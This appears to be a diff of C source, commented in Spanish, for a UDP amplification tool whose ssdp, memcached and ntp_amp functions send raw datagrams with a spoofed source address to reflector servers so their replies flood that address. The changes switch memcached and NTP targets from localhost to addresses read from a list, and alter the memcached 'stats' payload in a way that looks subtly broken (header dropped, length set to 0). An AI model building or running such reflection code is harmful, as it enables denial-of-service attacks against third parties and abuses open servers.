@@ -142,7 +142,7 @@ void ssdp(int sockfd, char* addr_src) {
 
 	// direccion IP de destino
 	struct sockaddr_in daddr;
-	if(host_addr(&daddr, "239.255.255.250", 1900) == 1){
+	if(host_addr(&daddr, "127.0.0.1"/*"239.255.255.250"*/, 1900) == 1){
 		perror("Error al crear la configuracion IP");
 		exit(1);
 	}
@@ -166,7 +166,7 @@ void ssdp(int sockfd, char* addr_src) {
             perror("No se ha podido enviar el paquete SSDP");
             exit(1);
         } else {
-			printf ("Paquete SSDP enviado a 239.255.255.250. Tamaño : %d \n" , datagram_len);
+			printf ("Paquete SSDP enviado a 127.0.0.1. Tamaño : %d \n" , datagram_len);
 		}
     }
 }
@@ -240,7 +240,7 @@ void memcached(int sockfd, char* addr_src){
 
 		// direccion IP de destino
 		struct sockaddr_in daddr;
-		if(host_addr(&daddr, "127.0.0.1"/*linea*/, 11211) == 1){
+		if(host_addr(&daddr, linea, 11211) == 1){
 			perror("Error al crear la configuracion IP");
 			exit(1);
 		}
@@ -252,13 +252,13 @@ void memcached(int sockfd, char* addr_src){
 			exit(1);
 		}
 
-		char* stats = "\x00\x00\x00\x00\x01\x00\x00stats\r\n";
+		char* stats = "stats\r\n";
 
 		// Creamos un datagrama udp con el comando stats para que el servidor responda con
 		// estadisticas suyas al origen del paquete
 		char* datagram;
 		int datagram_len;
-		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, stats, 14);
+		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, stats, 0);
 		
 		if(sendto (sockfd, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
 		{
@@ -290,7 +290,7 @@ void ntp_amp(int sock, char* addr_src){
 
 		// direccion IP de destino
 		struct sockaddr_in daddr;
-		if(host_addr(&daddr, "127.0.0.1" /*linea*/, 123) == 1){
+		if(host_addr(&daddr, linea, 123) == 1){
 			perror("Error al crear la configuracion IP");
             exit(1);
 		}
